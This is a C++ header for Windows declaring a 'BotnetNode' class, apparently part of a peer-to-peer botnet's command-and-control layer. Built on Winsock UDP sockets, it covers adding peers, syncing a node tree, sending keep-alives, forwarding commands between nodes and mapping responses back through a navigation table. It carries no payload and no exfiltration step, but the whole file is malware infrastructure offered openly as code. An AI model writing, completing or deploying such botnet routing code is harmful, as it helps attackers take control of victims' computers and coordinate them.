#pragma once

#include "network.h"

#include <map>
#include <vector>
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

typedef struct
{
	adr host;
	size_t n_branches;
} tree_ext;

class BotnetNode;

typedef struct 
{
	adr src_addr;
	uint16_t original_id;
} command_fowarding;

class BotnetNode
{
private:
	adr _adr;
	uint16_t _id;
	std::vector<BotnetNode*> _branches;
	std::map<uint16_t, command_fowarding> _nevigation_table;

	void sendNetTree(
		const SOCKET& udp_sock,
		const struct sockaddr_in& peer_addr,
		std::vector<adr>& hosts,
		char* const buf
	);

	BotnetNode* findNode(
		const adr& addr,
		std::vector<adr>& hosts
	);

	BotnetNode* findPath(
		const adr& addr,
		std::vector<adr>& hosts
	);

public:

	BotnetNode();

	BotnetNode(
		uint32_t ip, 
		uint16_t port
	);

	void addPeer(
		const u_char* data,
		const SOCKET& udp_sock
	);

	void handleSync(
		const u_char* pack,
		const struct sockaddr_in& peer_addr
	);
	
	void keepAlive(
		const SOCKET& udp_sock
	);

	uint16_t fowardCommand(
		uint16_t command_id,
		const struct sockaddr_in& src_addr
	);

	struct sockaddr_in nextPathNode(
		const adr& dest_addr,
		const adr& private_addr
	);

	adr retrieveCommand(
		u_char* const data
	)
	{
		struct botnet_pack* const command_res = (struct botnet_pack*)data;
		std::map<uint16_t, command_fowarding>::iterator it = _nevigation_table.find(command_res->numerics.id);

		if (it != _nevigation_table.end())
		{
			command_fowarding retrived_command = _nevigation_table[command_res->numerics.id];
			command_res->numerics.id = retrived_command.original_id;
			
			_id--;
			_nevigation_table.erase(it);
			
			return retrived_command.src_addr;
		}
		
		return { 0, 0 };
	}
};